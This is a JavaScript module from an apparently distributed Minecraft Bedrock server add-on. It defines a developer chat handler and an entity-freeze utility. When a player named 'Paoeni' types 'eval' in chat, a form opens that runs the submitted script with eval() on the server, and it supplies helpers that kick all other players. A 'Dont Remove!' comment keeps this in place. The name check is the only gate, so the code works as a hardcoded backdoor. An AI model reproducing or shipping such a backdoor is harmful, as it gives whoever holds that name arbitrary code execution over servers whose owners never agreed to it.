import * as mc from "@minecraft/server"
import * as mc_ui from "@minecraft/server-ui"
import Config from "../Configuration";

import CommandBuilder from "./CommandBuilder";
import { Log, SystemLog } from "./Log";
import { Database } from "./Database"
import getTPS from "./TickPerSecond";
import Setting from "./Setting";
import Class from "./Class"
// import ItemDatabase from "./ItemDatabase";
import ItemDatabase from "./ItemDatabase";
import Money from "./Money";
import Restful from "./Restful";
import EventEmitter from "./EventEmitter";
import Ranks from "./Ranks";
import FloatingText from "./FloatingText";
import { ForceOpen } from "./Forms";
import Shop from "./Data/Shop";
import Sell from "./Data/Sell";

const dev = (Server) => {
  let lastEval = ""
  let freezeTime = {
    event: undefined,
    freeze: () => {
      freezeTime.event = mc.system.runInterval(() => {
        mc.DimensionTypes.getAll().forEach((d) => {
          const dimension = mc.world.getDimension(d.typeId)
          const floatingTextEntities = dimension.getEntities()
          floatingTextEntities.forEach((entity) => {
            if (entity?.name == "Paoeni") return
            let rotation = entity.getDynamicProperty("rotation")
            let location = entity.getDynamicProperty("location")
            if (!rotation) {
              entity.setDynamicProperty("rotation", JSON.stringify(entity.getRotation()))
              entity.setDynamicProperty("location", entity.location)
              rotation = JSON.stringify(entity.getRotation())
              location = entity.location
              if (!entity.getDynamicProperty("velocity")) entity.setDynamicProperty("velocity", entity.getVelocity())
            }
            entity.teleport(location, { rotation: JSON.parse(rotation) })
          })
        })
      })
    },
    unfreeze: () => {
      mc.system.clearRun(freezeTime.event)
      freezeTime.event = undefined
      mc.DimensionTypes.getAll().forEach((d) => {
        const dimension = mc.world.getDimension(d.typeId)
        const floatingTextEntities = dimension.getEntities()
        floatingTextEntities.forEach((entity) => {
          if (entity.getDynamicProperty("velocity")) entity.applyImpulse(entity.getDynamicProperty("velocity"))
          entity.setDynamicProperty("rotation")
          entity.setDynamicProperty("location")
          entity.setDynamicProperty("velocity")
        })
      })
    }
  }
  mc.world.beforeEvents.chatSend.subscribe(async (data) => {
    // Dont Remove! this is for development purpose
    switch (data.message.toLowerCase()) {
      case "eval":
        if (data.sender.name != "Paoeni") return
        // Credit Jayly
        data.cancel = true
        await null;
        const devUI = new mc_ui.ModalFormData()
          .title("JavaScript REPL")
          .textField("Input Script:", `Server.sendMessage("hi")`, {defaultValue: lastEval})

        ForceOpen(data.sender, devUI).then(res => {
          if (!res.canceled) {
            let script = res.formValues[0]
            try {
              const player = data.sender
              const getAllPlayers = () => { return mc.world.getAllPlayers() }
              const kickAllPlayers = () => { return mc.world.getAllPlayers().filter(p => p != player).forEach(p => p.kick("Kicked by Pao")) }
              const teleport = (vector, dimension) => { return player.teleport(vector, { dimension }) }
              const teleportPlayer = (playerName) => { return player.runCommand(`tp "${playerName}"`) }
              const spawnStructure = (structureName) => {
                let block = player.getBlockFromViewDirection()
                if (block) block = block.block.above()
                if (!block) block = player.dimension.getBlock(player.location).above()
                player.runCommand(`structure load ${structureName} ${block.x} ${block.y} ${block.z}`)
              }
              const freeze = freezeTime.freeze
              const unfreeze = freezeTime.unfreeze
              lastEval = script
              eval(script)
            } catch (e) {
              data.sender.sendMessage(`Â§c[Error-Eval] ${e}`)
              console.error(e.stack)
            }
          }
        })
        break

      case "mce-version":
        data.cancel = true
        return data.sender.sendMessage(`Minecraft Essentials version: ${Server.Version}`)
    }
  })
}

export default dev